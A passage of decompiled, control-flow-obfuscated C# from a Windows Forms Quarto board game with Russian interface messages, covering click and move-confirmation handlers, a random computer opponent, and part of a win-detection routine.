		//IL_01e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fe: Expected O, but got Unknown
		Graphics graphics_ = default(Graphics);
		int num8 = default(int);
		int num3 = default(int);
		bool flag2 = default(bool);
		int num6 = default(int);
		int num7 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = 1374403584;
			while (true)
			{
				uint num2;
				int num12;
				switch ((num2 = (uint)num ^ 0x363F2BA3u) % 31u)
				{
				case 30u:
					Form1.smethod_45(graphics_);
					num = ((int)num2 * -2142492060) ^ -1058278665;
					continue;
				case 29u:
					if (board[num8, num3] == null)
					{
						num = 382662417;
						num12 = 382662417;
						continue;
					}
					goto IL_0032;
				case 28u:
					num = (int)(num2 * 1805708565) ^ -1044239840;
					continue;
				case 27u:
					num = ((int)num2 * -599903924) ^ -723677979;
					continue;
				case 26u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num3 + 0.05f) * (float)size, ((float)num8 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1631808178) ^ 0x5E6E556E;
					continue;
				case 25u:
					flag2 = num6 < 4;
					num = 380950839;
					continue;
				case 24u:
					num = ((int)num2 * -1610950506) ^ 0x591A023D;
					continue;
				case 23u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -1924425081) ^ 0x424C7468;
					continue;
				case 22u:
				{
					int num10;
					int num11;
					if (flag2)
					{
						num10 = 304510541;
						num11 = 304510541;
					}
					else
					{
						num10 = 1618506520;
						num11 = 1618506520;
					}
					num = num10 ^ (int)(num2 * 1127481612);
					continue;
				}
				case 21u:
				{
					int num9;
					if (Form1.smethod_41((Control)(object)borderBox[num7, num6]) == Color.Blue)
					{
						num = 76718668;
						num9 = 76718668;
					}
					else
					{
						num = 1353507322;
						num9 = 1353507322;
					}
					continue;
				}
				case 20u:
					num6 = 0;
					num = 209302360;
					continue;
				case 19u:
					num = ((int)num2 * -1058980047) ^ 0x2177A821;
					continue;
				case 18u:
					num7 = 0;
					num = ((int)num2 * -2044545207) ^ -458871200;
					continue;
				case 17u:
					Paint_Board();
					num = ((int)num2 * -1377470542) ^ -109934074;
					continue;
				case 16u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = ((int)num2 * -1378162617) ^ -770890897;
						continue;
					}
					goto IL_0032;
				case 15u:
					num8 = Form1.smethod_39(e) / size;
					num = (int)(num2 * 689522100) ^ -2029277037;
					continue;
				case 14u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num7, num6]), num3 * size + 4, num8 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)((num2 * 2039777876) ^ 0x38BBD74E);
					continue;
				case 13u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)((num2 * 1551310172) ^ 0x50CA6BC3);
					continue;
				case 12u:
					num = ((int)num2 * -886994505) ^ -402432661;
					continue;
				case 11u:
					num = (int)((num2 * 889776318) ^ 0x48167B94);
					continue;
				case 10u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = ((int)num2 * -297325084) ^ -1262423886;
					continue;
				case 8u:
					num = (int)(num2 * 868133121) ^ -276457606;
					continue;
				case 7u:
					flag = num7 < 4;
					num = 1242110191;
					continue;
				case 5u:
					num7++;
					num = (int)(num2 * 363257567) ^ -1856166866;
					continue;
				case 4u:
					num6++;
					num = 1502964015;
					continue;
				case 3u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = -371542670;
						num5 = -371542670;
					}
					else
					{
						num4 = -1631446152;
						num5 = -1631446152;
					}
					num = num4 ^ ((int)num2 * -1720931123);
					continue;
				}
				case 2u:
					num3 = Form1.smethod_38(e) / size;
					num = ((int)num2 * -304925607) ^ 0x1447997B;
					continue;
				case 1u:
					num = (int)(num2 * 1959600503) ^ -580944359;
					continue;
				case 0u:
					num = ((int)num2 * -1776332689) ^ 0x4A87B6AA;
					continue;
				default:
					return;
				case 6u:
					break;
				case 9u:
					return;
					IL_0032:
					num = 1865169060;
					num12 = 1865169060;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_118a: Unknown result type (might be due to invalid IL or missing references)
		//IL_11b8: Expected O, but got Unknown
		bool flag7 = default(bool);
		int num10 = default(int);
		bool flag3 = default(bool);
		Figurine[,] array = default(Figurine[,]);
		int num5 = default(int);
		int num6 = default(int);
		Figurine[,] array2 = default(Figurine[,]);
		int num30 = default(int);
		int num20 = default(int);
		bool flag5 = default(bool);
		int num36 = default(int);
		int num21 = default(int);
		int num37 = default(int);
		int num9 = default(int);
		int num18 = default(int);
		bool flag9 = default(bool);
		int num11 = default(int);
		int num19 = default(int);
		int num7 = default(int);
		Graphics graphics_ = default(Graphics);
		bool flag2 = default(bool);
		int num16 = default(int);
		int num17 = default(int);
		bool flag12 = default(bool);
		int num27 = default(int);
		int num28 = default(int);
		bool flag10 = default(bool);
		bool flag4 = default(bool);
		int num8 = default(int);
		Figurine[,] array3 = default(Figurine[,]);
		bool flag11 = default(bool);
		bool flag8 = default(bool);
		int num3 = default(int);
		bool flag = default(bool);
		int num34 = default(int);
		int num35 = default(int);
		bool flag6 = default(bool);
		while (true)
		{
			int num = -149609519;
			while (true)
			{
				uint num2;
				int num46;
				int num22;
				int num42;
				int num29;
				switch ((num2 = (uint)num ^ 0xC6023D52u) % 171u)
				{
				case 170u:
				{
					int num40;
					int num41;
					if (flag7)
					{
						num40 = -1926740557;
						num41 = -1926740557;
					}
					else
					{
						num40 = -532438199;
						num41 = -532438199;
					}
					num = num40 ^ ((int)num2 * -1129987549);
					continue;
				}
				case 169u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					Form1.smethod_30((Control)(object)label2);
					num = (int)(num2 * 1724012726) ^ -530100151;
					continue;
				case 168u:
					num10++;
					num = (int)(num2 * 1118036112) ^ -75372696;
					continue;
				case 167u:
					num = ((int)num2 * -2005166017) ^ 0x37C082FD;
					continue;
				case 166u:
				{
					int num64;
					int num65;
					if (flag3)
					{
						num64 = 753331220;
						num65 = 753331220;
					}
					else
					{
						num64 = 1212200037;
						num65 = 1212200037;
					}
					num = num64 ^ ((int)num2 * -740422076);
					continue;
				}
				case 165u:
					num = -1867418979;
					continue;
				case 164u:
					step++;
					num = (int)((num2 * 534953392) ^ 0x7E57617);
					continue;
				case 163u:
					if (!Stop(array))
					{
						num = (int)((num2 * 986803800) ^ 0x35FA5AD4);
						continue;
					}
					goto IL_011b;
				case 162u:
					Form1.smethod_20(pictureBox[num5, num6], (Image)null);
					num = ((int)num2 * -516756462) ^ 0x58E486B3;
					continue;
				case 161u:
					num = ((int)num2 * -353933630) ^ 0x6954FB82;
					continue;
				case 160u:
				{
					int num31;
					if (array2[num30, num20] == null)
					{
						num = -1960866719;
						num31 = -1960866719;
					}
					else
					{
						num = -154711041;
						num31 = -154711041;
					}
					continue;
				}
				case 159u:
					num = (int)((num2 * 814975387) ^ 0x2512B3E4);
					continue;
				case 158u:
					Form1.smethod_30((Control)(object)pictureBox[num5, num6]);
					num = (int)((num2 * 947829547) ^ 0x7C987C2D);
					continue;
				case 157u:
					num = ((int)num2 * -1197763357) ^ 0x3EF8CEF5;
					continue;
				case 156u:
				{
					int num61;
					int num62;
					if (flag5)
					{
						num61 = 1983656554;
						num62 = 1983656554;
					}
					else
					{
						num61 = 1017184354;
						num62 = 1017184354;
					}
					num = num61 ^ ((int)num2 * -1178816565);
					continue;
				}
				case 155u:
					num5 = num10;
					num = ((int)num2 * -1114826672) ^ 0x4503D18C;
					continue;
				case 154u:
					num = ((int)num2 * -571245000) ^ -1816790216;
					continue;
				case 153u:
					num = (int)(num2 * 1461265457) ^ -1022078930;
					continue;
				case 152u:
					num = -61884215;
					continue;
				case 151u:
					num36 = num21;
					num37 = num9;
					num = ((int)num2 * -1278598329) ^ -29314168;
					continue;
				case 150u:
				{
					int num56;
					if (num18 < 4)
					{
						num = -1597523907;
						num56 = -1597523907;
					}
					else
					{
						num = -939484773;
						num56 = -939484773;
					}
					continue;
				}
				case 149u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					Form1.smethod_15(timer1);
					num = ((int)num2 * -1722075776) ^ -1074395365;
					continue;
				case 148u:
				{
					int num52;
					int num53;
					if (flag9)
					{
						num52 = -1939335322;
						num53 = -1939335322;
					}
					else
					{
						num52 = -870016827;
						num53 = -870016827;
					}
					num = num52 ^ ((int)num2 * -486582703);
					continue;
				}
				case 147u:
					Form1.smethod_7((Control)(object)pictureBox[num10, num11], bool_0: false);
					num = ((int)num2 * -1012252394) ^ -548079100;
					continue;
				case 146u:
					Form1.smethod_30((Control)(object)pictureBox[num5, num6]);
					num = ((int)num2 * -557646476) ^ 0x61EAA100;
					continue;
				case 145u:
					num6 = num11;
					num = (int)((num2 * 1089849364) ^ 0x4A9E5709);
					continue;
				case 144u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)((num2 * 1665219133) ^ 0x37C17971);
					continue;
				case 143u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)((num2 * 867136061) ^ 0x5459C6DC);
					continue;
				case 142u:
					num46 = ((num19 < 9) ? 1 : 0);
					goto IL_0398;
				case 141u:
					num = -409536592;
					continue;
				case 140u:
					Form1.smethod_5((Control)(object)borderBox[num5, num6], Color.White);
					Form1.smethod_30((Control)(object)borderBox[num5, num6]);
					num = ((int)num2 * -981624320) ^ 0x791BE3C5;
					continue;
				case 139u:
					num21++;
					num = ((int)num2 * -1469022497) ^ -126391215;
					continue;
				case 138u:
					num = -637086681;
					continue;
				case 137u:
				{
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					int num32;
					int num33;
					if (!Form1.smethod_46((Control)(object)pictureBox1))
					{
						num32 = 1916709235;
						num33 = 1916709235;
					}
					else
					{
						num32 = 1370961313;
						num33 = 1370961313;
					}
					num = num32 ^ (int)(num2 * 1768444913);
					continue;
				}
				case 136u:
					num7 = 0;
					num = -773624974;
					continue;
				case 135u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)((num2 * 81969797) ^ 0x7B23FB1B);
					continue;
				case 134u:
				{
					int num26;
					if (num20 < 4)
					{
						num = -1580921599;
						num26 = -1580921599;
					}
					else
					{
						num = -494272348;
						num26 = -494272348;
					}
					continue;
				}
				case 133u:
					num22 = ((!Standoff(board)) ? 1 : 0);
					goto IL_04b3;
				case 132u:
					num = ((int)num2 * -621084457) ^ -389498448;
					continue;
				case 131u:
				{
					int num14;
					int num15;
					if (flag2)
					{
						num14 = -228748954;
						num15 = -228748954;
					}
					else
					{
						num14 = -2138855830;
						num15 = -2138855830;
					}
					num = num14 ^ ((int)num2 * -689344545);
					continue;
				}
				case 130u:
					flag3 = board[num16, num17] != null;
					num = (int)(num2 * 1661199926) ^ -1980473622;
					continue;
				case 129u:
					num = ((int)num2 * -1868862140) ^ -1601944799;
					continue;
				case 128u:
					num5 = 0;
					num = ((int)num2 * -1377135861) ^ -245725865;
					continue;
				case 127u:
					flag12 = num30 < 4;
					num = -991654155;
					continue;
				case 126u:
					num = ((int)num2 * -2076384436) ^ -1663138178;
					continue;
				case 124u:
					Form1.smethod_30((Control)(object)borderBox[num27, num28]);
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = (int)((num2 * 1261904563) ^ 0x3AEAE092);
					continue;
				case 123u:
					flag10 = num10 < 4;
					num = -1544652547;
					continue;
				case 122u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = ((int)num2 * -1407764574) ^ -1579306577;
					continue;
				case 121u:
					num = ((int)num2 * -304089448) ^ 0x2C6B6583;
					continue;
				case 120u:
					num = -2015976509;
					continue;
				case 119u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -88601651) ^ 0x7DFF8083;
					continue;
				case 118u:
					num = ((int)num2 * -2073412720) ^ -285494476;
					continue;
				case 117u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -481790745) ^ 0x471952B3;
					continue;
				case 116u:
					num7++;
					num = -748988635;
					continue;
				case 115u:
					flag4 = Standoff(board);
					num = -720102111;
					continue;
				case 114u:
					Form1.smethod_5((Control)(object)borderBox[num27, num28], Color.Blue);
					num = (int)((num2 * 1373721899) ^ 0x6743F238);
					continue;
				case 113u:
					Form1.smethod_47(200);
					num = (int)(num2 * 1144972395) ^ -640400267;
					continue;
				case 112u:
				{
					int num63;
					if (num8 >= 4)
					{
						num = -1222728982;
						num63 = -1222728982;
					}
					else
					{
						num = -679753099;
						num63 = -679753099;
					}
					continue;
				}
				case 111u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num = ((int)num2 * -1518277932) ^ 0x71B1F8D0;
					continue;
				case 110u:
					num = (int)(num2 * 1331170404) ^ -1284029016;
					continue;
				case 109u:
					Form1.smethod_47(1000);
					num = ((int)num2 * -1052526105) ^ -687106103;
					continue;
				case 108u:
				{
					int num59;
					int num60;
					if (Form1.smethod_41((Control)(object)borderBox[num21, num9]) == Color.Blue)
					{
						num59 = -435983637;
						num60 = -435983637;
					}
					else
					{
						num59 = -845299670;
						num60 = -845299670;
					}
					num = num59 ^ (int)(num2 * 899503237);
					continue;
				}
				case 107u:
					flag7 = num7 < 4;
					num = -258744831;
					continue;
				case 106u:
					array3[num30, num20] = new Figurine(storage[num27, num28]);
					num = ((int)num2 * -336379378) ^ -569965283;
					continue;
				case 105u:
					storage[num5, num6] = null;
					num = ((int)num2 * -1259609049) ^ -792208194;
					continue;
				case 104u:
					num = ((int)num2 * -1669507895) ^ -54557489;
					continue;
				case 103u:
					num = (int)(num2 * 240462280) ^ -1655504104;
					continue;
				case 102u:
					num11++;
					num = -481682285;
					continue;
				case 101u:
					num11 = 0;
					num = -481682285;
					continue;
				case 100u:
				{
					int num57;
					int num58;
					if (flag11)
					{
						num57 = 946339872;
						num58 = 946339872;
					}
					else
					{
						num57 = 814872836;
						num58 = 814872836;
					}
					num = num57 ^ ((int)num2 * -1110939623);
					continue;
				}
				case 99u:
					num = (int)((num2 * 1173940238) ^ 0x5E09F119);
					continue;
				case 98u:
					num = ((int)num2 * -22079801) ^ 0x6D8A1130;
					continue;
				case 97u:
					num10 = 0;
					num = ((int)num2 * -1782106202) ^ -446037344;
					continue;
				case 96u:
					Form1.smethod_30((Control)(object)pictureBox[num21, num9]);
					num = ((int)num2 * -1314853128) ^ 0x2F4898C5;
					continue;
				case 95u:
				{
					int num54;
					int num55;
					if (!flag8)
					{
						num54 = -1451297181;
						num55 = -1451297181;
					}
					else
					{
						num54 = -105245330;
						num55 = -105245330;
					}
					num = num54 ^ (int)(num2 * 1281759467);
					continue;
				}
				case 94u:
					num3 = 0;
					num = ((int)num2 * -893619174) ^ 0x36DECC71;
					continue;
				case 93u:
					if (!flag)
					{
						num = ((int)num2 * -301232244) ^ 0x73F73B69;
						continue;
					}
					num46 = 1;
					goto IL_0398;
				case 92u:
				{
					int num50;
					int num51;
					if (!flag12)
					{
						num50 = -1961531185;
						num51 = -1961531185;
					}
					else
					{
						num50 = -523359362;
						num51 = -523359362;
					}
					num = num50 ^ ((int)num2 * -871198828);
					continue;
				}
				case 91u:
					Form1.smethod_30((Control)(object)borderBox[num10, num11]);
					num = (int)(num2 * 398794513) ^ -1196036958;
					continue;
				case 90u:
					num34 = num21;
					num = ((int)num2 * -521719112) ^ 0x61F9C2BF;
					continue;
				case 89u:
					num = -65427957;
					continue;
				case 88u:
					num = (int)(num2 * 1584372878) ^ -2065801304;
					continue;
				case 87u:
					num = ((int)num2 * -364629834) ^ -554705555;
					continue;
				case 86u:
				{
					board[num8, num7] = new Figurine(storage[num5, num6]);
					storage[num5, num6] = null;
					int num48;
					int num49;
					if (!Standoff(board))
					{
						num48 = -1474879714;
						num49 = -1474879714;
					}
					else
					{
						num48 = -539454193;
						num49 = -539454193;
					}
					num = num48 ^ ((int)num2 * -878538558);
					continue;
				}
				case 85u:
				{
					int num47;
					if (num21 >= 4)
					{
						num = -2138820880;
						num47 = -2138820880;
					}
					else
					{
						num = -32818066;
						num47 = -32818066;
					}
					continue;
				}
				case 84u:
					num35 = num9;
					num = (int)((num2 * 1155653907) ^ 0x299A3F09);
					continue;
				case 83u:
				{
					int num45;
					if (num11 >= 4)
					{
						num = -1527396189;
						num45 = -1527396189;
					}
					else
					{
						num = -381895987;
						num45 = -381895987;
					}
					continue;
				}
				case 82u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = ((int)num2 * -958593319) ^ -282194028;
					continue;
				case 81u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num18], bool_0: true);
					num = -713098901;
					continue;
				case 80u:
				{
					int num43;
					int num44;
					if (!flag10)
					{
						num43 = 1436868136;
						num44 = 1436868136;
					}
					else
					{
						num43 = 1442907518;
						num44 = 1442907518;
					}
					num = num43 ^ ((int)num2 * -124883941);
					continue;
				}
				case 79u:
					num37 = 0;
					num34 = 0;
					num35 = 0;
					num = ((int)num2 * -140674708) ^ 0x44750739;
					continue;
				case 78u:
					Form1.smethod_47(200);
					num = ((int)num2 * -1956684722) ^ -1469286789;
					continue;
				case 77u:
					if (!Standoff(array))
					{
						num = -1803695089;
						num42 = -1803695089;
						continue;
					}
					goto IL_011b;
				case 76u:
					num19 = 0;
					num = (int)(num2 * 1599054134) ^ -1302588318;
					continue;
				case 75u:
					num3++;
					num = (int)((num2 * 534620547) ^ 0x6DDACAAD);
					continue;
				case 74u:
					num30++;
					num = (int)(num2 * 1218956596) ^ -1119919262;
					continue;
				case 73u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num17 + 0.05f) * (float)size, ((float)num16 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)(num2 * 479881191) ^ -1017178403;
					continue;
				case 72u:
					num = ((int)num2 * -1473020239) ^ -395921326;
					continue;
				case 71u:
					Form1.smethod_5((Control)(object)borderBox[num21, num9], Color.White);
					Form1.smethod_30((Control)(object)borderBox[num21, num9]);
					Form1.smethod_20(pictureBox[num21, num9], (Image)null);
					num = (int)(num2 * 935857945) ^ -1010266972;
					continue;
				case 70u:
					array2[num16, num17] = new Figurine(storage[num5, num6]);
					num30 = 0;
					num = ((int)num2 * -1145344119) ^ 0x6C381241;
					continue;
				case 69u:
					num = ((int)num2 * -1054075383) ^ 0x7EFE109A;
					continue;
				case 68u:
					num29 = ((num28 == num6) ? 1 : 0);
					goto IL_0c7e;
				case 67u:
					array3 = (Figurine[,])Form1.smethod_48((Array)array2);
					num = ((int)num2 * -1207513668) ^ -1525827234;
					continue;
				case 66u:
					board[num16, num17] = new Figurine(storage[num5, num6]);
					num = ((int)num2 * -841386810) ^ -1461297258;
					continue;
				case 65u:
					flag6 = Stop(array3);
					num = ((int)num2 * -1508276865) ^ -1553034436;
					continue;
				case 64u:
					num36 = 0;
					num = (int)(num2 * 762840962) ^ -1535952616;
					continue;
				case 63u:
					flag8 = num9 < 4;
					num = -347366294;
					continue;
				case 62u:
				{
					int num38;
					int num39;
					if (!flag6)
					{
						num38 = -1339577311;
						num39 = -1339577311;
					}
					else
					{
						num38 = -1094421968;
						num39 = -1094421968;
					}
					num = num38 ^ (int)(num2 * 1702585461);
					continue;
				}
				case 61u:
					num = -1353060740;
					continue;
				case 60u:
					num = -154711041;
					continue;
				case 59u:
					num = (int)((num2 * 686361753) ^ 0x5170FDB1);
					continue;
				case 58u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num5, num6]), num17 * size + 4, num16 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)(num2 * 895661656) ^ -1978024367;
					continue;
				case 57u:
					num16 = Form1.smethod_33(rnd, 4);
					num17 = Form1.smethod_33(rnd, 4);
					num = (int)((num2 * 437846010) ^ 0x2F9FC0F1);
					continue;
				case 56u:
					array[num8, num7] = new Figurine(storage[num5, num6]);
					num = (int)(num2 * 417175251) ^ -1581004706;
					continue;
				case 55u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = ((int)num2 * -329190711) ^ -185274700;
					continue;
				case 54u:
					num = (int)(num2 * 749055008) ^ -1851637409;
					continue;
				case 53u:
					Paint_Board();
					num = (int)((num2 * 1990814551) ^ 0x52A88696);
					continue;
				case 52u:
					num = ((int)num2 * -506461285) ^ -1035618365;
					continue;
				case 51u:
					num27 = Form1.smethod_33(rnd, 4);
					num28 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 201512004) ^ -874866589;
					continue;
				case 50u:
					num = (int)((num2 * 1098899852) ^ 0x41EE1B88);
					continue;
				case 49u:
					board[num34, num35] = new Figurine(storage[num36, num37]);
					storage[num36, num37] = null;
					num = ((int)num2 * -1138023849) ^ -963217406;
					continue;
				case 48u:
					num = -365841647;
					continue;
				case 47u:
					num = ((int)num2 * -1774716556) ^ -796073520;
					continue;
				case 46u:
					num = ((int)num2 * -2040391235) ^ -1157310393;
					continue;
				case 45u:
					flag5 = board[num8, num7] == null;
					num = -1771289009;
					continue;
				case 44u:
					num18 = 0;
					num = -794160087;
					continue;
				case 43u:
					if (num27 == num5)
					{
						num = (int)(num2 * 988532251) ^ -723038724;
						continue;
					}
					num29 = 0;
					goto IL_0c7e;
				case 42u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -1510983837) ^ 0x68302576;
					continue;
				case 41u:
					if (storage[num27, num28] != null)
					{
						num = ((int)num2 * -891356499) ^ -204310792;
						continue;
					}
					num29 = 1;
					goto IL_0c7e;
				case 40u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 1522947913) ^ 0x61A44089);
					continue;
				case 39u:
					num = ((int)num2 * -2129121232) ^ 0x44664A8B;
					continue;
				case 38u:
				{
					int num24;
					int num25;
					if (flag4)
					{
						num24 = 2106822223;
						num25 = 2106822223;
					}
					else
					{
						num24 = 216243347;
						num25 = 216243347;
					}
					num = num24 ^ (int)(num2 * 1659592459);
					continue;
				}
				case 37u:
					num = -819645835;
					continue;
				case 36u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = -990782987;
					continue;
				case 35u:
					num = ((int)num2 * -597916354) ^ 0x52751ED0;
					continue;
				case 34u:
					num = ((int)num2 * -2047405201) ^ 0x4F2D3E65;
					continue;
				case 33u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -1239605392) ^ 0xBA17C9F;
					continue;
				case 32u:
					Form1.smethod_5((Control)(object)borderBox[num10, num11], Color.LimeGreen);
					num = (int)((num2 * 638275917) ^ 0x344CB3FB);
					continue;
				case 31u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num7 + 0.05f) * (float)size, ((float)num8 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -792416183) ^ -83367098;
					continue;
				case 30u:
					num = ((int)num2 * -1377297973) ^ 0x4B26142A;
					continue;
				case 29u:
					num20++;
					num = -1357690280;
					continue;
				case 28u:
					Form1.smethod_15(timer1);
					num = -885396680;
					continue;
				case 27u:
					num8 = 0;
					num = ((int)num2 * -1418336016) ^ 0x46DDF49;
					continue;
				case 26u:
				{
					int num23;
					if (!(Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num9 * size + size / 2, (int)(((float)num21 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0)))
					{
						num = -168838380;
						num23 = -168838380;
					}
					else
					{
						num = -1240567120;
						num23 = -1240567120;
					}
					continue;
				}
				case 25u:
					if (!Stop(board))
					{
						num = ((int)num2 * -658028657) ^ -235229421;
						continue;
					}
					num22 = 0;
					goto IL_04b3;
				case 24u:
					num = (int)(num2 * 2064271946) ^ -1668307040;
					continue;
				case 23u:
					num8++;
					num = (int)((num2 * 1452258525) ^ 0x4C0162F3);
					continue;
				case 22u:
					flag = false;
					num = ((int)num2 * -1760885737) ^ 0x18B8A50A;
					continue;
				case 21u:
					num = ((int)num2 * -1325830511) ^ -845619451;
					continue;
				case 20u:
					num21 = 0;
					num = ((int)num2 * -1323014072) ^ -988002505;
					continue;
				case 19u:
					Form1.smethod_5((Control)(object)borderBox[num5, num6], Color.White);
					Form1.smethod_30((Control)(object)borderBox[num5, num6]);
					num = (int)(num2 * 380661564) ^ -864355233;
					continue;
				case 18u:
					num = ((int)num2 * -1781997572) ^ 0x792216FE;
					continue;
				case 17u:
					num20 = 0;
					num = -169284434;
					continue;
				case 16u:
					Form1.smethod_20(pictureBox[num5, num6], (Image)null);
					num = (int)((num2 * 814359938) ^ 0x5ED60BE7);
					continue;
				case 15u:
					num19++;
					num = ((int)num2 * -527945873) ^ -1618137347;
					continue;
				case 14u:
					num = (int)(num2 * 1988541334) ^ -1569261867;
					continue;
				case 13u:
					num6 = 0;
					num = (int)((num2 * 1620538915) ^ 0x6F94E92B);
					continue;
				case 12u:
					num9 = 0;
					num = -1007376034;
					continue;
				case 10u:
					num = ((int)num2 * -1321290785) ^ -290403174;
					continue;
				case 9u:
					num18++;
					num = (int)((num2 * 1783030525) ^ 0xFE673F6);
					continue;
				case 8u:
					array2 = (Figurine[,])Form1.smethod_48((Array)board);
					num = (int)(num2 * 245129281) ^ -1735426483;
					continue;
				case 7u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					num = (int)(num2 * 1118625778) ^ -749154487;
					continue;
				case 6u:
				{
					int num12;
					int num13;
					if (Form1.smethod_41((Control)(object)borderBox[num10, num11]) == Color.Red)
					{
						num12 = 1958222370;
						num13 = 1958222370;
					}
					else
					{
						num12 = 1110233359;
						num13 = 1110233359;
					}
					num = num12 ^ (int)(num2 * 1295966176);
					continue;
				}
				case 5u:
					flag = true;
					num = ((int)num2 * -64805603) ^ -924882289;
					continue;
				case 4u:
					num9++;
					num = ((int)num2 * -38812760) ^ 0x199B2B76;
					continue;
				case 3u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num5, num6]), num7 * size + 4, num8 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -1000125294) ^ 0x1AC09969;
					continue;
				case 2u:
					num = (int)(num2 * 736032717) ^ -4195758;
					continue;
				case 1u:
				{
					int num4;
					if (num3 >= 4)
					{
						num = -473099040;
						num4 = -473099040;
					}
					else
					{
						num = -1649685599;
						num4 = -1649685599;
					}
					continue;
				}
				case 0u:
					num = -1862309912;
					continue;
				default:
					return;
				case 125u:
					break;
				case 11u:
					return;
					IL_04b3:
					flag2 = (byte)num22 != 0;
					num = -484418488;
					continue;
					IL_0c7e:
					flag9 = (byte)num29 != 0;
					num = -1095873527;
					continue;
					IL_0398:
					flag11 = (byte)num46 != 0;
					num = -1502861776;
					continue;
					IL_011b:
					num = -1549093642;
					num42 = -1549093642;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		bool flag = false;
		int num3 = default(int);
		bool flag3 = default(bool);
		bool flag2 = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = -986845623;
			while (true)
			{
				uint num2;
				int num22;
				int num8;
				switch ((num2 = (uint)num ^ 0xCB652185u) % 77u)
				{
				case 76u:
					flag = true;
					num = ((int)num2 * -1394769952) ^ 0x174ECED4;
					continue;
				case 75u:
				{
					int num61;
					int num62;
					if (mem[3, 3] != null)
					{
						num61 = 555789657;
						num62 = 555789657;
					}
					else
					{
						num61 = 646083915;
						num62 = 646083915;
					}
					num = num61 ^ (int)(num2 * 1694559401);
					continue;
				}
				case 74u:
					if (mem[num3, 2].Big != mem[num3, 3].Big)
					{
						num = ((int)num2 * -581911501) ^ -211744839;
						continue;
					}
					goto IL_007a;
				case 73u:
				{
					int num41;
					int num42;
					if (mem[num3, 0] == null)
					{
						num41 = 733605447;
						num42 = 733605447;
					}
					else
					{
						num41 = 1550872865;
						num42 = 1550872865;
					}
					num = num41 ^ ((int)num2 * -2121680538);
					continue;
				}
				case 72u:
				{
					int num66;
					int num67;
					if (mem[1, 1].Point == mem[2, 2].Point)
					{
						num66 = -613990210;
						num67 = -613990210;
					}
					else
					{
						num66 = -786611027;
						num67 = -786611027;
					}
					num = num66 ^ ((int)num2 * -1939627260);
					continue;
				}
				case 71u:
				{
					int num51;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num = -1553735738;
						num51 = -1553735738;
					}
					else
					{
						num = -621484383;
						num51 = -621484383;
					}
					continue;
				}
				case 70u:
					if (mem[num3, 2].Dark != mem[num3, 3].Dark)
					{
						num = ((int)num2 * -1638521937) ^ -1967121587;
						continue;
					}
					goto IL_007a;
				case 69u:
				{
					int num27;
					if (mem[0, num3].Dark != mem[1, num3].Dark)
					{
						num = -1615768407;
						num27 = -1615768407;
					}
					else
					{
						num = -1389774077;
						num27 = -1389774077;
					}
					continue;
				}
				case 68u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = ((int)num2 * -684398902) ^ 0x61184461;
						continue;
					}
					goto IL_01ca;
				case 67u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = ((int)num2 * -1375776721) ^ -1816961507;
						continue;
					}
					goto IL_01d6;
				case 65u:
				{
					int num57;
					if (mem[0, 3].Point == mem[1, 2].Point)
					{
